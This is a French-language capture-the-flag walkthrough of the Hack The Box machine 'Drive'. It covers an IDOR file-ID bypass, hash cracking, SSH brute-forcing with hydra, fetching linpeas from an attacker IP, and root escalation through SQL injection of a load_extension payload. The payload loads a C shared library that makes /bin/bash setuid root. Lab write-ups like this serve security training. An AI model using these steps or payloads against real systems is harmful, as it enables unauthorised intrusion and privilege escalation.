  # Drive

	echo "10.10.11.235 drive.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.235 -e tun0 > ports.txt
	sudo nmap -p- -T4 -A 10.10.11.235 -oN nmap.txt
	feroxbuster --silent -u http://drive.htb/
	
Scans classiques.

    PORT     STATE    SERVICE VERSION
    22/tcp   open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 27:5a:9f:db:91:c3:16:e5:7d:a6:0d:6d:cb:6b:bd:4a (RSA)
    |   256 9d:07:6b:c8:47:28:0d:f2:9f:81:f2:b8:c3:a6:78:53 (ECDSA)
    |_  256 1d:30:34:9f:79:73:69:bd:f6:67:f3:34:3c:1f:f9:4e (ED25519)
    80/tcp   open     http    nginx 1.18.0 (Ubuntu)
    |_http-server-header: nginx/1.18.0 (Ubuntu)
    |_http-title: Did not follow redirect to http://drive.htb/
    3000/tcp filtered ppp


Pages : 

    + http://drive.htb/contact (CODE:301|SIZE:0)                                                                       
    + http://drive.htb/favicon.ico (CODE:200|SIZE:2348)                                                                
    + http://drive.htb/home (CODE:301|SIZE:0)                                                                          
    + http://drive.htb/login (CODE:301|SIZE:0)                                                                         
    + http://drive.htb/logout (CODE:301|SIZE:0)                                                                        
    + http://drive.htb/register (CODE:301|SIZE:0)                                                                      
    + http://drive.htb/reports (CODE:301|SIZE:0)                                                                       
    + http://drive.htb/subscribe (CODE:301|SIZE:0)                                                                     
    + http://drive.htb/upload (CODE:301|SIZE:0)                                                                        
    + http://drive.htb/upload_file (CODE:302|SIZE:0)                                                                   
    + http://drive.htb/upload_files (CODE:302|SIZE:0)                                                                  
    + http://drive.htb/uploaded (CODE:302|SIZE:0)                                                                      
    + http://drive.htb/uploadedfiles (CODE:302|SIZE:0)                                                                 
    + http://drive.htb/uploadedimages (CODE:302|SIZE:0)                                                                
    + http://drive.htb/uploader (CODE:302|SIZE:0)                                                                      
    + http://drive.htb/uploadfile (CODE:302|SIZE:0)                                                                    
    + http://drive.htb/uploadfiles (CODE:302|SIZE:0)                                                                   
    + http://drive.htb/uploads (CODE:302|SIZE:0) 
    

On a la possibilité de s'inscrire sur le site.

C'est un genre de service de stockage de fichiers.

L'URL d'un fichier contient un ID. Exemple : http://drive.htb/100/getFileDetail/ 


En passant cette URL à Burp Intruder et en modifiant l'ID de 1 à 999, on obtient des erreurs 401 en plus des pages en 200 auxquelles on a déjà accès. Les fichiers 79, 98, 99, 101 et 112 renvoient cette erreur.

Impossible de visualiser les fichiers directement mais les autres fonctions semblent marcher, notamment celle du blocage. En construisant une URL de type http://drive.htb/79/block on arrive à réserver, et voir, le fichier.

Quelques résultats intéressants : 

- Le fichier 79 contient un nom et un mot de passe
- Le fichier 101 contient des informations sur une base de données compressée et stockée dans /var/www/backups/ 
- Le fichier 112 contient un reverse-shell en PHP



Le SSH sur la machine fonctionne, avec les credentials trouvés dans le fichier 79. Cependant, il n'y pas de flag utilisateur.

	ssh martin@10.10.11.235

## Pivoting

	sudo -l
	find / -perm /4000 2>/dev/null

    wget http://10.10.16.60/linpeas.sh
    chmod u+x linpeas.sh
    ./linpeas.sh | tee linpeas.txt

Rien d'intéressant avec l'énumération classique.

Toutefois, en fouillant le répertoire mentionné dans le fichier 101, on trouve un fichier **db.sqlite3** en plus des fameuses sauvegardes compressées et bien protégées par mot de passe : 

    ls /var/www/backups
    ...
    scp martin@drive.htb:/var/www/backups/db.sqlite3 ~/dump/
    sqlitebrowser ~/dump/db.sqlite3 
    
Dans la table "accounts_customuser" on trouve plusieurs hashes dont un cassable : 

    vim hashes.txt
    hashid -m hashes.txt
    hashcat -m 124 -a 0 hashes.txt ~/wordlists/rockyou.txt
    
On obtient le mot de passe pour Tom mais il ne fonctionne pas pour le SSH. Comme il était très faible j'ai lancé un Hydra sur des variantes en tâche de fond au cas où : 

    grep "^john.*[0-9]$" rockyou.txt --text > ~/john.txt
    hydra -l tom -P ~/john.txt 10.10.11.235 -t 64 ssh 
    
Le bruteforce a fonctionné, donnant accès au compte de Tom :  

    su tom 
    cat ~/user.txt

## Élévation de privilèges


    sudo -l
	find / -perm /4000 2>/dev/null
    
On trouve un fichier intéressant avec SUID : 

>/home/tom/doodleGrive-cli


Quand on exécute ce fichier, il demande juste un nom et un mot de passe. J'ai réussi à les trouver facilement avec un peu d'énumération classique pour les binaires : 

    ./doodleGrive-cli
    strings doodleGrive-cli
    
En lisant plus profondément ce résultat on voit aussi quelques requêtes qui semblent correspondre aux différentes options du menu principal après l'authentification : 

>/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line 'UPDATE >accounts_customuser SET is_active=1 WHERE username="%s";'
><br>Activating account for user '%s'...
><br>/usr/bin/sudo -u www-data /usr/bin/tail -1000 /var/log/nginx/access.log


Voir : 
- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#remote-command-execution-using-sqlite-command---load_extension 

- https://www.sqlite.org/c3ref/load_extension.html


Code de l'extension : 

    #include <stdlib.h>
    #include <unistd.h>
    void sqlite3_a_init() {
        setuid(0);
        setgid(0);
        system("chmod 4777 /bin/bash");
    }

Compilation : 

    gcc -shared extension_sqlite_bash_suid.c -o a.so -nostartfiles -fPIC

Payload à injecter dans l'exécutable quand il nous demande le nom du compte à activer : 

    "+load_extension(char(46,47,97))+"
    
Exécution finale : 

    ./doodleGrive-cli
    ...
    /bin/bash -p 
	whoami
	cat /root/root.txt
